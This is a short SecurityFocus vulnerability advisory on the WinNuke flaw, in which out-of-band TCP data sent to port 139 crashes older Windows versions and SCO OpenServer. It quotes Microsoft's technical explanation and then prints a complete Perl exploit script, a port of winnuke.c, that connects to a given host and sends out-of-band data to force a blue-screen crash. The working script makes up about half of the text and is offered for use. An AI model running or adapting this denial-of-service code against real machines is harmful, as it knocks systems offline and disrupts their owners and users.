source: http://www.securityfocus.com/bid/2010/info
  
Older versions of Microsoft Windows (95, Windows for Workgroups 3.11, Windows NT up to and including 4.0), as well as SCO Open Server 5.0, have a vulnerability relating to the way they handle TCP/IP "Out of Band" data.
  
According to Microsoft, "A sender specifies "Out of Band" data by setting the URGENT bit flag in the TCP header. The receiver uses the URGENT POINTER to determine where in the segment the urgent data ends. Windows NT bugchecks when the URGENT POINTER points to the end of the frame and no normal data follows. Windows NT expects normal data to follow. "
  
As a result of this assumption not being met, Windows gives a "blue screen of death" and stops responding.
  
Windows port 139 (NetBIOS) is most susceptible to this attack. although other services may suffer as well. Rebooting the affected machine is required to resume normal system functioning. 

#!/usr/bin/perl

# Ghent - ghent@bounty-hunters.com - Perl version of winnuke.c by _eci

use strict; use Socket;

my($h,$p,$in_addr,$proto,$addr);

$h = "$ARGV[0]"; $p = 139 if (!$ARGV[1]);
if (!$h) { print "A hostname must be provided. Ex: www.microsoft.com\n"; }

$in_addr = (gethostbyname($h))[4]; $addr = sockaddr_in($p,$in_addr);
$proto = getprotobyname('tcp');
socket(S, AF_INET, SOCK_STREAM, $proto) or die $!;

connect(S,$addr) or die $!; select S; $| = 1; select STDOUT;

print "Nuking: $h:$p\n"; send S,"Sucker",MSG_OOB; print "Nuked!\n"; close S;

